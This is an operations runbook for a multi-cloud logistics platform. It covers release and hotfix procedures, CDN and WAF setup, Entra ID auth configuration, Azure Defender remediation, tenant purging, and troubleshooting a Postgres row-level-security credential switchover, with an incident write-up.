# Operational Runbook

Logistics & Cargo Management System — platform operations guide.

## Environments

| Environment | AWS Account | Region | Notes |
|---|---|---|---|
| dev | — | eu-west-1 | Aurora auto-pause enabled |
| staging | — | eu-west-1 | Aurora auto-pause enabled |
| prod | — | eu-west-1 | No auto-pause; DR replication to eu-central-1 |

---

## Common Operations

- **Tail Lambda logs:** `aws logs tail /aws/lambda/logistics-<service>-prod --follow`
- **Check alarms:** AWS CloudWatch → Alarms → `logistics-*`
- **Dashboard:** CloudWatch → Dashboards → `logistics-prod-overview`

---

## Release Procedures

### Normal release to staging

Create and push an RC tag from a commit that has a green CI run on `main`:

```bash
git tag v1.2.3-rc1 <sha>
git push origin v1.2.3-rc1
```

Only members of `@{org}/release-managers` can push `v*` tags (GitHub tag protection ruleset).
The deploy pipeline resolves the CI artifact for the tagged commit SHA — the tag push will fail
at the `resolve-artifact` step if no successful CI run exists for that commit.

### Normal release to prod

After staging smoke tests pass, push the stable tag:

```bash
git tag v1.2.3 <sha>
git push origin v1.2.3
```

The `deploy-prod` job requires `smoke-staging` to have passed on the same workflow run. A
read-only `smoke-prod` job (GET /health + unauthenticated-401 checks + 2s SLA) then runs after
the prod deploy and fails the pipeline loudly if prod came up unhealthy.

> **Azure infra** has its own pipeline (`terraform-azure.yml`, dev→staging→prod, OIDC) — see
> `docs/project docs/18_cicd_pipeline.md` → "Azure deployment pipeline".

### Post-prod observation window

After every prod deploy, watch CloudWatch for **5 minutes**:

1. Open the `logistics-prod-overview` CloudWatch dashboard
2. Check: Lambda Errors (all functions) — should remain at 0
3. Check: API Gateway 5xx Errors — should remain at 0
4. Check: SQS DLQ — all queues should have 0 visible messages

If alarms fire within the window, initiate rollback immediately (see below).
If all metrics are green at 5 minutes, deployment is complete — no further action needed.

---

## Frontend Deployment & Go-Live

The frontend is a static Vite/React SPA served as **S3 (private) + CloudFront (CDN)** — the cost-effective, scalable, resilient, highly-available pattern. All of it is in Terraform (`infrastructure/aws/modules/cloudfront/`) and CI (`.github/workflows/frontend-ci.yml`); the design is complete, so go-live is **provisioning + DNS/cert + secrets**, not new code.

> **Azure alternative:** the same SPA can deploy to **Blob static site + Front Door Standard** — see `infrastructure/azure/` (root stack + `modules/frontend`) and its `README.md`. Same `frontend/dist/` artifact, different target cloud. Cost: `docs/azure_cost_model.md`.

> **Backend cloud portability (`CLOUD_PROVIDER`):** the backend selects its cloud at runtime via the `CLOUD_PROVIDER` env var (`aws` default | `azure`). Cloud SDKs live only behind the ports in `shared/providers/` — `KeyProvider` (crypto/KMS), `StorageProvider` (object storage), `SecretsProvider` (Secrets Manager), `EventProvider` (EventBridge), `QueueProvider` (SQS), `EmailProvider` (SES) — each with an AWS adapter today. Presigned uploads use a cloud-neutral **PUT** contract (`{ upload_url, upload_method, upload_headers }`) that both S3 and Azure Blob satisfy. X-Ray tracing is behind a shim (`shared/observability.py::init_tracing`, called at each Lambda's module load; no-op when `CLOUD_PROVIDER != "aws"`). To port a touchpoint to Azure: add the `shared/providers/azure/*` adapter and set `CLOUD_PROVIDER=azure` + the Azure-side env vars (`ENCRYPTION_KEY_VAULT_KEY_ID`, `BLOB_CONTAINER_NAME`, …). The one remaining boto3 touchpoint is **Cognito** (auth) — migrated behind the same pattern, but it also needs a token-claim mapping + user migration to Entra, so it's scoped separately rather than a drop-in adapter. See `docs/project docs/02_shared_utilities.md` → "shared/providers/" and `infrastructure/azure/README.md`.

```
Browser ──TLS──▶ CloudFront (global edge, PriceClass_100)
                   │  OAC (signed origin reads)
                   ▼
                 S3 bucket (private, versioned, SSE)  ← CI `aws s3 sync dist/`
```

**Why this meets the four goals** (for reference):
- **Cost** — no servers; S3 pennies/GB + CloudFront egress; `PriceClass_100` (US/EU edges only); hashed assets cached `immutable` for 1 year so origin GETs + invalidations are near-zero (only `/index.html` is invalidated per deploy). Scales to ~$0 at idle.
- **Scalable** — CloudFront absorbs any spike with no capacity planning; S3 throughput is effectively unlimited.
- **Resilient** — S3 11-nines durability + versioning (instant rollback); CI uploads hashed assets first and `index.html` last so no user ever gets a half-updated app; private bucket + OAC (no public exposure).
- **HA** — S3 + CloudFront are multi-AZ/global managed services; no single server to fail. SPA deep-links survive via `custom_error_response` 403/404 → `/index.html` (200).

### What's already implemented (verified)
- Private, versioned, SSE-encrypted S3 origin; all public access blocked; CloudFront reads via **OAC**.
- CloudFront: HTTP/2+3, IPv6, `redirect-to-https`, TLS1.2_2021, compression, security-headers policy incl. CSP (`connect-src` scoped to the API Gateway + Cognito domains), cache policies (immutable assets vs. no-cache `index.html`), SPA fallback.
- **ACM cert in us-east-1** (CloudFront requirement) via the `aws.us_east_1` provider alias, DNS-validated through Route 53 — handled automatically by the module.
- Route 53 apex + `*.domain` wildcard A-alias records (wildcard backs tenant subdomains).
- **WAFv2 Web ACL** attached to the distribution (rate limit + AWS IP reputation + common rule set + known-bad-inputs) — see "DDoS & attack protection" below.
- CI deploy job (`deploy`): OIDC auth (no static keys), gated to `push` on `main` + the `prod` GitHub Environment (approval-capable; shared with the backend so one set of reviewers gates both), builds with prod `VITE_*`, syncs assets `immutable`, uploads `index.html` `no-cache`, invalidates `/index.html`.
- Module outputs: `distribution_id`, `distribution_domain`, `s3_bucket_name`, `s3_bucket_arn`, `waf_web_acl_arn`.

> **Note:** the Terraform has **not been `apply`'d** yet (see "Open infrastructure decisions"), and the CloudFront module is **gated on `route53_zone_id`** (`count = var.route53_zone_id != "" ? 1 : 0`) — it creates nothing until a hosted zone is supplied.

### One-time go-live — prerequisites
1. **Register / delegate the domain** and create a **Route 53 hosted zone** for it. Note the zone ID.
2. Set these in the prod tfvars (or TF Cloud/CI variables):
   - `domain_name` = e.g. `app.shipx.example`
   - `route53_zone_id` = the hosted-zone ID from step 1
   - `frontend_price_class` = `PriceClass_100` (default; bump to `PriceClass_200/All` only if you need edges beyond US/EU)
3. **OIDC deploy role** (`infrastructure/aws/modules/iam-oidc`): ensure the GitHub Actions deploy role used for the frontend has `s3:PutObject`/`s3:DeleteObject` on the frontend bucket and `cloudfront:CreateInvalidation` on the distribution. (The frontend workflow reads `FRONTEND_DEPLOY_ROLE_ARN` separately from the backend's `AWS_DEPLOY_ROLE_ARN` — either extend the existing role's policy to cover the frontend bucket/distribution, or add a dedicated role.)

### One-time go-live — provision
```bash
cd infrastructure/aws
terraform plan  -var-file=prod.tfvars   # review: S3 bucket, CloudFront dist, ACM cert, Route53 records
terraform apply -var-file=prod.tfvars   # ACM DNS validation can take a few minutes
terraform output                        # grab cloudfront distribution_id + s3_bucket_name
```

### One-time go-live — CI secrets (GitHub → repo/Environment `production`)
| Secret | Value |
|---|---|
| `FRONTEND_DEPLOY_ROLE_ARN` | OIDC role ARN (s3:PutObject + cloudfront:CreateInvalidation) |
| `FRONTEND_S3_BUCKET` | `terraform output … s3_bucket_name` |
| `FRONTEND_CLOUDFRONT_ID` | `terraform output … distribution_id` |
| `VITE_API_BASE_URL` | prod API Gateway URL |
| `VITE_COGNITO_USER_POOL_ID` / `VITE_COGNITO_CLIENT_ID` | prod Cognito |
| `VITE_ENVIRONMENT` | `production` |

### First + ongoing deploys
- **First deploy:** push to `main` (or re-run the `frontend-ci` workflow). The `deploy` job builds with the prod `VITE_*`, syncs to S3, invalidates `/index.html`. Verify at `https://<domain_name>` — hard-refresh, confirm a deep link (e.g. `/admin/users`) loads, and that API/Cognito calls succeed (CSP allows only the configured domains).
- **Ongoing:** every push to `main` touching `frontend/**` redeploys automatically (path-filtered; backend-only changes don't trigger it).

### Rollback
- Fastest: re-run the `frontend-ci` workflow on the last-good commit (rebuilds + re-syncs).
- Or restore prior object versions from the versioned bucket, then `aws cloudfront create-invalidation --paths "/index.html"`.

### DDoS & attack protection (what's in place)
The frontend has defence in depth across layers:
- **AWS Shield Standard** — automatic + free on every CloudFront distribution; absorbs L3/L4 (network/transport) DDoS (SYN floods, reflection, etc.). No config needed.
- **WAFv2 Web ACL** (`aws_wafv2_web_acl.frontend`, scope `CLOUDFRONT`, us-east-1) — now attached via `web_acl_id`. Rules, in order:
  1. **Rate limit** (`var.waf_rate_limit`, default 2000 req/IP/5min) → **block** — the primary layer-7 DDoS / brute-force control. Raise for offices behind a shared NAT; lower to tighten.
  2. **Amazon IP reputation list** — blocks known bot/recon/DDoS source IPs.
  3. **Common rule set** — XSS, LFI, protocol/size abuse (safe on this static-asset origin).
  4. **Known bad inputs** — known exploit signatures (Log4Shell, path traversal, host-header injection).
  - Each rule + the ACL emit CloudWatch metrics with sampled requests (tune thresholds / spot false positives from the WAF console). Cost ≈ $5/mo (ACL) + ~$1/rule/mo + $0.60 per million requests.
- **Private origin** — S3 is reachable only via CloudFront OAC; there is no public bucket URL to attack directly.

**API layer (API Gateway + Lambda):** the API is an **HTTP API (v2)**, which **cannot take a WAFv2 ACL directly** (WAF supports REST/v1 APIs, ALB, AppSync, Cognito, CloudFront — not HTTP APIs). Its protections today: **Shield Standard** (automatic), **stage throttling** (`throttling_rate_limit = 50` req/s, `throttling_burst_limit = 100` in `api-gateway/main.tf`), Lambda reserved-concurrency ceilings, and per-tenant metering/quota. If you later want full L7 WAF on the API, the standard pattern is to **front API Gateway with its own CloudFront distribution** and attach a `REGIONAL`→`CLOUDFRONT` WAF there (a deliberate follow-up, not required for launch).

**Monitoring:** add a CloudWatch alarm on the WAF `BlockedRequests` metric (sudden spikes = an active attack or a too-tight rate limit); sampled requests in the WAF console show what's being blocked.

### Other hardening (optional)
- Code-split the ~937 kB single JS chunk for faster first paint (known item, not a blocker).
- For high-value launches under sustained attack, **AWS Shield Advanced** (paid) adds L7 DDoS cost protection + a response team.

---

## Azure deployment — required one-time setup (Entra auth)

**Applies only when `DEPLOY_CLOUD=azure`.** The Azure pipeline deploys everything except **one**
Entra-tenant step that has **no Terraform/azuread resource** and that the Contributor deploy identity
cannot perform. **Login is broken until it's done** — the deploy succeeds (the claims provider runs
as a Container App on the shared image and reads tenant_id/role from the ShipX DB), but Entra never
calls it, so tokens carry no `tenant_id`/`role` and every request resolves as an unprivileged
`customer` (platform admin included). Do this once per Entra tenant, after the first
`deploy-azure.yml` run has created the resources. Full context: `infrastructure/azure/README.md`
→ "Entra tenant setup" + "Token claims on CIAM".

> No Microsoft Graph permission grant is needed — the claims provider reads `tenant_user` by the
> Entra `oid` (persisted in `cognito_sub` by the user migration), not the directory. The earlier
> `User.Read.All` grant is **not** part of this flow.

**Prerequisite (done by the tenant admin, before the step below):** an Entra External ID tenant +
SPA app registration exist, `scripts/setup_entra_platform_admin.sh` has been run (creates the
`platform_admin` group + the first admin), and the user migration (`scripts/migrate_users_to_entra.py`)
has provisioned tenant users (it stamps each one's Entra `oid` into `tenant_user.cognito_sub`, which
is how the claims provider resolves them). Set the deploy tfvars — `auth_provider="azure"`,
`oidc_jwks_url`/`oidc_audience`, **`entra_platform_admin_group_id`** (the `platform_admin` group id —
this is what makes the platform admin resolve), and `entra_claims_*` for the claims provider — so a
deploy wires them into the API/claims containers. (`ENTRA_TENANT_ID_CLAIM`/`ENTRA_ROLE_CLAIM` stay at
their `tenant_id`/`role` defaults.)

**Run the setup script — it does all of it, idempotently:**

```bash
az login                                    # a user who can manage app regs + grant consent
# from a checkout with Terraform initialised for the target env (it auto-reads the
# claims endpoint + frontend URL from `terraform output`):
./scripts/setup_entra_claims_provider.sh
#   or pass values explicitly:
#   SPA_APP_ID=<spa client id> CLAIMS_ENDPOINT=https://<app>.azurecontainerapps.io/ \
#   FRONTEND_URL=https://<frontdoor-host> ./scripts/setup_entra_claims_provider.sh
```

`scripts/setup_entra_claims_provider.sh` (idempotent — safe to re-run) performs every tenant step
the pipeline can't:

1. Registers the **`/auth/callback` redirect URI under the `publicClient` platform** — and removes it
   from the `spa` platform if an earlier run put it there. **The platform type is the part that
   matters.** ShipX redeems the auth code in the backend (BFF, `services/auth/handler.py::_callback`)
   with PKCE and no client secret, which is a public-client redemption. Registered as `spa`, Entra
   then *requires* a cross-origin redemption and rejects the backend with
   `AADSTS9002327`; adding an `Origin` header to satisfy that fails the other way with
   `AADSTS9002326`. Only `publicClient` works, and it must not be in both.
2. Ensures the **resource app** the extension authenticates to (exposes
   `CustomAuthenticationExtensions.Receive.Payload`; its appId is the `aud` the claims provider
   validates — `services/entra_token_claims/security.py`).
3. Creates/reconciles the **onTokenIssuanceStart custom authentication extension** pointing at the
   claims Container App, emitting `tenant_id` + `role`.
4. **Binds** it to the SPA app via an `authenticationEventListener` (so Entra calls it every sign-in).
5. Best-effort **admin-consent** (prints the portal "Grant permission" fallback if a click is needed).
6. Prints the exact **`entra_claims_caller_audience` / `_issuer` / `_jwks_url`** tfvars to set — then
   re-run `deploy-azure.yml` so the claims container validates the inbound token with those values.

(The portal/Graph `/beta` equivalents are `customAuthenticationExtensions` + `authenticationEventListeners`
under Enterprise apps → Custom authentication extensions, if you ever need to do it by hand.)

> **On CIAM the claims provider's output never reaches the token — and ShipX does not rely on it.**
> Binding the extension only makes Entra **call** the provider. Whether the returned claims land in
> the token is a separate app-level setting (`api.acceptMappedClaims = true` plus each claim declared
> under `optionalClaims` with source `customClaimsProvider`), and on an **Entra External ID (CIAM)**
> tenant that setting **does not work**. Graph accepts the PATCH and reports success; CIAM honours a
> different (service-principal) surface and caps custom claims from `onTokenIssuanceStart`.
>
> Measured on the dev CIAM tenant — the provider was called and returned the right values, and the
> token carried neither:
>
> ```
> claims provider  → Claims issued for oid=b541f352…: {'tenant_id': '530aa7c9…', 'role': 'tenant_admin'}
> issued id_token  → [...'groups','iat','iss','name','nbf','nonce','oid',...]
>                    has tenant_id=False  has role=False  has oid=True
> ```
>
> **Resolution (PR #75):** `shared/auth.py::resolve_identity_from_db` resolves `tenant_id` + `role`
> from `tenant_user` by the token's `oid` — the same authoritative row the claims provider reads —
> cached 60s per subject with negative caching, and consulted *only* when the token lacks the claim.
> `/v1/auth/callback` and `/v1/auth/refresh` also return them so the SPA can build its session.
> Sign-in therefore works whether or not steps 2–5 above succeed. Step 4b is retained only because
> it is harmless and *is* effective on a workforce (non-CIAM) tenant.
>
> A consequence worth knowing: on CIAM the `*-entra-claims` Container App is **not load-bearing**. It
> is kept for workforce-tenant parity and as a second source of truth; it could be retired for a
> CIAM-only deployment.

**Verify:** sign in via the SPA and confirm the dashboard loads. Decoding the **id_token** is still
useful, but expect `tenant_id`/`role` to be **absent** on CIAM — presence of `oid` is what matters:

```bash
python3 -c "import sys,json,base64; p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4); \
print(sorted(json.loads(base64.urlsafe_b64decode(p)).keys()))" '<id_token>'
```

If sign-in fails with `JWT is missing required claims (sub|oid / tenant id)`, the DB resolution did
not find the user. Check the API logs for `Identity resolution failed for subject <oid>` and confirm
a `tenant_user` row exists with `id` = that `oid` **and** `status = 'active'`
(`tenant_user.id` *is* the Entra `oid`). This step persists across deploys and does not need
repeating.

**Rollback / cloud switch:** flipping `DEPLOY_CLOUD` back to `aws` returns auth to Cognito with no
Entra dependency; the Entra objects can stay in place, dormant.

### Graph provisioning app (tenant creation / user provisioning)

Creating a tenant provisions its initial admin as an Entra user via Microsoft Graph
(`EntraIdentityProvider`). On a CIAM setup the Container App's **managed identity cannot do this** —
it lives in the subscription's home tenant and is single-tenant, so it can't mint a Graph token for
the CIAM tenant (`DefaultAzureCredential` fails; `POST /v1/platform/tenants` → `500 Could not create
tenant`). Provision a dedicated confidential app **in the CIAM tenant**:

**Use `scripts/setup_entra_auth.sh`** — it does steps 1–2 idempotently, *verifies* consent rather
than trusting the command's exit code, and prints the tfvars to set:

```bash
az login --tenant <CIAM tenant id> --allow-no-subscriptions
ENTRA_TENANT_ID=<CIAM tenant id> ./scripts/setup_entra_auth.sh
#   DRY_RUN=1    report intended changes only
#   SKIP_SECRET=1 reconcile permissions without rotating the secret
```

It refuses to run unless the logged-in tenant matches `ENTRA_TENANT_ID`, because ShipX spans two
tenants (the subscription's workforce tenant and the CIAM tenant) and configuring the wrong one is
not obviously recoverable.

Equivalent manual steps:

1. Register an app in the CIAM tenant (e.g. `shipx-graph-provisioner`) with these Microsoft Graph
   **Application** permissions, then **Grant admin consent** (app-only — no delegated/user context):
   - `User.ReadWrite.All` — create/update the tenant user
   - `Group.ReadWrite.All` — add them to the `{tenant}:{role}` group
   - `User-PasswordProfile.ReadWrite.All` — **set the initial password.** Microsoft split this out of
     `User.ReadWrite.All`; without it `set_password` fails with
     `403 Authorization_RequestDenied — Insufficient privileges` and activation cannot complete. After
     granting it, **restart the API revision**: the Graph token is cached for ~1h, so the old token
     without the role keeps being used and the 403 appears to persist.
2. Create a **client secret** on that app.
3. Set `entra_graph_tenant_id` (the CIAM tenant id) and `entra_graph_client_id` (the new app's client
   id) in the environment's tfvars.
4. Add the secret as the **GitHub Environment secret `ENTRA_GRAPH_CLIENT_SECRET`** (injected at apply
   via `TF_VAR_entra_graph_client_secret` — never committed), then re-run `deploy-azure.yml` so the
   API/worker/job containers pick up `ENTRA_GRAPH_CLIENT_ID` + the secret.
5. **Self-service sign-up must be OFF.** ShipX owns signup (company requests onboarding via the ShipX
   form; a platform admin provisions). Left on, the hosted page offers "Create account" and a stranger
   can mint a directory user with no `tenant_user` row — an account that authenticates and resolves to
   nothing. `setup_entra_auth.sh` turns it off; portal path is
   External Identities → User flows → *flow* → Settings → disable sign-up.

With the client id empty, the provider falls back to the managed identity (provisioning stays
disabled but nothing else breaks). This step persists across deploys. **Verify:** provision a tenant
from the platform console; it should return 201 and the admin user should appear in the CIAM tenant.

---

## Azure security baseline (Defender for Cloud)

Microsoft Defender for Cloud scored the subscription **30%**. Remediation policy, set by the
business: **staging, demo and prod must satisfy every recommendation, paid and unpaid. Dev gets only
the controls that are free.**

### Why dev needs its own subscription

Defender plans are enabled and **billed per subscription, not per resource group**. Today everything
— `shipx-tfstate-rg` and `shipx-dev-rg` — lives in one subscription
(`21156c4a-2977-448d-8de2-c523028d2f28`). Enabling the paid plans for prod there would enable and
bill them for dev too, so the stated dev exemption is **not expressible** until dev is separated.
Additional subscriptions under the same billing account are free.

Target layout:

| Subscription | Holds | Defender |
|---|---|---|
| dev | dev + tfstate | Free tier only |
| hardened | staging, demo, prod | All plans Standard |

### Applying it

Subscription-scoped settings live in their own root, `infrastructure/azure/subscription/`, **not** in
the per-environment stack — three environments sharing a subscription would each try to own the same
settings and fight over them on every apply. Apply once per subscription:

```bash
cd infrastructure/azure/subscription
terraform init  -backend-config=environments/hardened.backend.hcl
terraform apply -var-file=environments/hardened.tfvars     # or dev.tfvars
```

It owns the six Defender plans (tier driven by `enable_paid_defender_plans`), the subscription
security contact, and high-severity alert email. The dev tfvars writes tier `Free` **explicitly**
rather than omitting the plans, so a plan enabled by hand in the portal shows up as drift instead of
being silently ignored.

Malware scanning is billed per GB, so `malware_scanning_cap_gb_per_month` (default 500) bounds a
runaway upload.

### Findings deliberately NOT remediated

Three recommendations are wrong for this architecture. Each should carry a Defender **exemption with
a written justification** — leaving them silently red is worse than exempting them on the record.

| Finding | Why | Compensating control |
|---|---|---|
| Private link on the frontend storage account | It is the **SPA static-website** origin behind Front Door **Standard**. Private-link origins need Front Door **Premium** (~$330/mo vs ~$35), and locking it down breaks the public site. It hosts deliberately-public assets. | Front Door origin restriction; no anonymous blob access |
| Private link on the tfstate account | Reached by GitHub Actions runners over the public internet; private link means self-hosted/VNet runners. | Runner IP allowlist + shared-key disabled + Entra-only auth |
| VNet rules on the assets account | The app issues **shared-key SAS URLs that browsers hit directly** (`shared/providers/azure/blob.py`). Default-deny kills every upload/download: the browser comes from the customer's network, not the VNet. Same pattern as S3 presigned URLs. | SAS-only (no anonymous access), short expiry, HTTPS-only; move to user-delegation SAS so access is identity-bound and revocable |

`There should be more than one owner assigned to subscriptions` (High) needs a second human granted
Owner. Terraform could assign it, but hardcoding a person's object id into version control is worse
than an operator action — do it in the portal.

### Still outstanding

- Free-tier environment hardening: Key Vault RBAC (needs *User Access Administrator* on the deploy
  identity — the same prerequisite that keeps `grant_acr_pull = false`), Key Vault firewall + purge
  protection, Key Vault/Service Bus diagnostic logs, Postgres Entra auth.
- Paid environment hardening: private endpoints for Key Vault + Event Grid + assets storage; ACR
  **Premium** (both ACR findings require it — Basic supports neither network rules nor private link).
- Two app-code migrations, each its own PR:
  - **Disable storage shared-key access** — requires `blob.py` to use managed identity *and* switch
    presigned URLs to a **user-delegation SAS**. A credential swap alone is not enough: SAS
    generation currently needs the account key.
  - **Postgres Entra-auth-only** — requires `shared/db.py` to fetch an AAD access token as the
    password per connection.

---

## Purging a tenant (test/abandoned data)

`offboard_tenant` only sets a status — correct for a real customer, but it never
removes data. To actually delete a test or abandoned tenant use
**`scripts/purge_tenant.py`**. A plain `DELETE FROM tenant` cannot work: 26 FKs
reference `tenant(id)` with `ON DELETE RESTRICT`, so Postgres refuses until every
dependent row is gone.

The script derives the delete order from the **live schema** (every table with a
`tenant_id` column, FK graph read from `pg_constraint`, topologically sorted so
children go first), which means tables added by future migrations are picked up
automatically instead of rotting in a hardcoded list.

**Safety:** dry-run is the default and only prints row counts; `--yes` is required
to delete; all deletes run in **one transaction** so any failure rolls back.
The onboarding **lead** is deliberately *not* deleted — it is reopened
(`tenant_id` cleared, `status='new'`) so the company can be re-provisioned.

The database is private (VNet), so run it from inside a container:

```bash
# 1. DRY RUN — always do this first and read the output.
az containerapp exec -g shipx-dev-rg -n shipx-dev-api \
  --command "python3 scripts/purge_tenant.py --email someone@example.com --dry-run"

# 2. Delete, once the dry run looks right.
az containerapp exec -g shipx-dev-rg -n shipx-dev-api \
  --command "python3 scripts/purge_tenant.py --email someone@example.com --yes"
```

`--email` matches `tenant_user.email` **or** `tenant.primary_contact_email`;
`--tenant-id` targets a specific tenant. Both are repeatable.

> `az containerapp exec` needs a TTY — run it from a real terminal, not a script.

**Afterwards:** the Entra directory user is *not* removed (the script only touches
the database). That is usually what you want — it frees the email for
re-provisioning, since the duplicate guard checks `tenant_user`, not the
directory. To remove the directory account too:
`DELETE https://graph.microsoft.com/v1.0/users/<oid>`.

## Hotfix Procedure (break-glass)

Use when a critical bug is in prod and cannot wait for the normal tag-based release cycle.

**Prerequisites:** You must be a member of `@{org}/release-managers`.

### Option A — Tag the hotfix commit directly (preferred)

1. Create and push the hotfix on a branch, get it reviewed and merged to `main`
2. Confirm CI passes on the merge commit
3. Tag directly for prod:
   ```bash
   git tag v1.2.4 <hotfix-sha>
   git push origin v1.2.4
   ```
4. Pipeline deploys; observe the 5-minute window (above)

### Option B — `workflow_dispatch` (last resort, when Option A cannot be used)

This is a break-glass procedure. A **post-incident review is required** after any `workflow_dispatch`
to prod.

1. Go to **Actions → Deploy Pipeline → Run workflow**
2. Select `environment: prod`
3. Provide `run_id`: find the CI Pipeline run ID for the commit you want to deploy
   (Actions tab URL contains the run ID, or use `gh run list --workflow=ci.yml`)
4. Run workflow
5. Observe the 5-minute window (above)
6. File a post-incident review in `docs/adr/` documenting why the normal path was bypassed

---

## RLS credential switchover (migration 060)

The application connects as `logistics_app`, not the Aurora master user. If a
deploy leaves the app unable to reach the database, this is the first thing to
check.

### What is in play

| | role | secret | why |
|---|---|---|---|
| service Lambdas | `logistics_app` | `<prefix>-db-app-password` | DML only, no BYPASSRLS → RLS enforced |
| migrate Lambda | `postgres` | `<prefix>-db-password` **and** the app secret | DDL needs the owner; it also sets the app role's password |
| RDS Proxy | both | both auth blocks | the proxy rejects a user it holds no secret for |

### Symptoms and causes

**`FATAL: password authentication failed for user "logistics_app"`**
Three causes. The cheap one first: **the two passwords disagree** — the role's
password came from `APP_DB_PASSWORD`, the application connects with
`DATABASE_PASSWORD`, and they must be the same value. Migration 060 prints a
`WARNING:` when it detects this, so check the migrate output before anything
else. (This is what broke `e2e-local-stack`: `.env.local.sample` shipped two
different placeholders and the workflow copies that file unedited.)

Otherwise: either migration 060 has not run in this environment, or it ran without
`APP_DB_SECRET_ARN` (it then logs `APP_DB_SECRET_ARN not set — migration 060
will leave logistics_app NOLOGIN` and leaves the role unable to log in, by
design). Confirm, as the master user:

```sql
SELECT rolcanlogin, rolbypassrls FROM pg_roles WHERE rolname = 'logistics_app';
-- expected: t | f
```

Then re-invoke the migrate Lambda. 060 is idempotent — it re-sets the same
password from the same secret.

**Migrate job fails: `must be superuser to change bypassrls attribute`**
`ALTER ROLE ... NOBYPASSRLS` requires SUPERUSER, and a **managed** Postgres admin
login is not a superuser — neither Azure Flexible Server's nor RDS's. Both
migration 060 and `ensure_app_role_password` now issue that statement **only when
the role actually has BYPASSRLS set**, which it does not by default
(`CREATE ROLE` defaults to NOBYPASSRLS), so the normal path needs no privilege.

If you do see it, the role genuinely has BYPASSRLS and the error is correct to
surface: an application role that bypasses RLS makes migration 059's policies
inert, which is the entire thing the switchover exists to fix. It cannot be
cleared from SQL on a managed server — raise it with the platform, or recreate
the role.

This failed every Azure deploy once while passing locally, because a local
Docker superuser *can* run the statement.

**`PAM authentication failed` / proxy-level auth error, with the role looking
correct in `pg_roles`**
The RDS Proxy is missing the second `auth` block, so it will not proxy that
user at all. Check the proxy's auth entries list both secrets.

**Every query returns zero rows, no error**
`app.current_tenant_id` is not being set on the connection. Under the canonical
policy an unset tenant matches nothing — it **fails closed**, which is correct
but looks like an empty database. `shared/db.py::_set_tenant` is the only place
that sets it.

**`permission denied for table <x>`**
A table created without the app role's grants. Migration 059 ran
`ALTER DEFAULT PRIVILEGES`, so any table created by the migration owner is
granted automatically — a table created by some other role will not be. Fix
forward with an explicit `GRANT` in a migration; do not grant by hand in
production, or the next environment will differ.

### Two phases — know which one you are in

**Phase 1** provisions the credential and repoints nothing: the secret exists,
and migration 060 has set the password on `logistics_app`. `DATABASE_USER` still
names the owner, so the symptoms above cannot occur yet.

**Phase 2** flips `DATABASE_USER` (and, on AWS, `DB_SECRET_ARN` plus the IAM
resource). Only after phase 2 is the application actually subject to RLS.

To check which phase an environment is in:

```sql
SELECT rolcanlogin FROM pg_roles WHERE rolname = 'logistics_app';  -- t after phase 1
```
```bash
# AWS
aws lambda get-function-configuration --function-name logistics-api-<env> \
  --query 'Environment.Variables.DATABASE_USER'
# Azure
az containerapp show -g <rg> -n <api-app> \
  --query "properties.template.containers[0].env[?name=='DATABASE_USER'].value"
```

The phases are deliberately separate. `DATABASE_USER` takes effect the moment
infrastructure applies, but migrations run later in the deploy — and on AWS the
two are in **different pipelines** (`terraform.yml` vs `deploy.yml`), so an
apply alone contains no migration step at all. Flipping in the same change as
provisioning would start the app on a password-less role.

#### The one case the phasing no longer protects: a brand-new environment

Both phases are now in `main`. The separation was between two *deploys* of a
codebase that changed in between — it is **not** a property of the code. So an
environment that has never run either phase gets both in its first apply, which
is precisely the combination the phasing existed to avoid: the app comes up as
`logistics_app` before migration 060 has ever run there, and cannot
authenticate until it does.

This applies to a fresh account, a new region, a rebuilt stack, and to any
environment whose `terraform apply` has been failing — check before assuming an
environment is on phase 1 merely because phase 1 was merged.

For a first-ever bring-up, apply in two steps rather than one:

```bash
# 1. Provision and migrate, with the app still on the owner.
terraform apply -var-file=environments/<env>.tfvars \
  -var 'db_user_override=postgres'      # or revert the two phase-2 lines locally
<run the migrate job / migrate Lambda>

# 2. Confirm, then apply normally.
psql -c "SELECT rolcanlogin FROM pg_roles WHERE rolname = 'logistics_app';"  -- t
terraform apply -var-file=environments/<env>.tfvars
```

The check in step 2 is the whole point: `t` means step 1 worked, and a `f` here
is the difference between a clean bring-up and an environment that comes up
unable to reach its database.

### Incident 2026-11-09: phase 2 rolled back, `logistics_app` could not log in

Phase 2 was merged after phase 1's Azure deploy reported success, on the
inference that migration 060 must therefore have set the role's password. That
inference was **wrong**, and the deploy's new DB-reachability probe caught it:

```
health: 200
db reachability (/v1/invites/<bogus>): 500
FAIL: expected 404 (database reachable, token absent), got 500
```

Note `health: 200` beside it. Every pre-existing smoke check passed. Without the
probe added in the same change, this deploy would have gone green with an API
that could not reach its database at all.

Rolled back by reverting the two Terraform env changes (owner credential
restored); the probe was deliberately kept.

**Resolved 2026-11-10 — root cause, and why no diagnosis is needed any more.**

Migration 060 sets the role's password from `APP_DB_PASSWORD`, but **Alembic runs
a migration exactly once per database**. 060 shipped in #126 and deployed to
Azure dev on 2026-11-08 — a day before #128 created the `db-app-password`
secret. So 060 took its no-op branch, left the role NOLOGIN, and recorded itself
as applied. #128 then provisioned the secret and 060 never ran again.

The credential is now applied by `shared.db_credentials.ensure_app_role_password`
after **every** successful upgrade, from both migrate entrypoints
(`scripts/migrate.py`, which is the container image's `migrate` command, and
`services/migrate/handler.py` for AWS). It is idempotent and repairs both
possible causes without anyone having to work out which occurred — 060 consumed
as a no-op, or the password drifting from the secret.

**So the fix is: run the migrate job.** No manual SQL, no re-attempt ceremony.

Verified against the reproduced failure state (role set NOLOGIN, alembic pinned
at 060 so no migration could run):

```
before:  psql -U logistics_app  ->  FATAL: role "logistics_app" is not permitted to log in
         python scripts/migrate.py  ->  (no migrations) "App role credential: set"
after:   rolcanlogin = t, rolbypassrls = f, app connects
```

**If it still fails after a migrate run** — in order, because each answers a
different cause:

```sql
-- 1. Does the role exist, and can it log in?
SELECT rolname, rolcanlogin, rolbypassrls FROM pg_roles WHERE rolname = 'logistics_app';
```

If `rolcanlogin = f`, migration 060 took its no-op branch — it logs
`APP_DB_PASSWORD not set - leaving logistics_app NOLOGIN` and still **succeeds**,
so a green migration step proves nothing. Read the migrate job's own log:

```bash
az containerapp job logs show -g <rg> --name <prefix>-job-migrate \
  --execution <exec> --container migrate --tail 200 | grep -i logistics_app
```

If `rolcanlogin = t` but the app still 500s, the role's password and the
`db-app-password` secret have diverged — 060 set it from `APP_DB_PASSWORD` at
some earlier apply, and `random_password.app` has since been regenerated.
Re-running the migrate job re-sets it from the current secret.

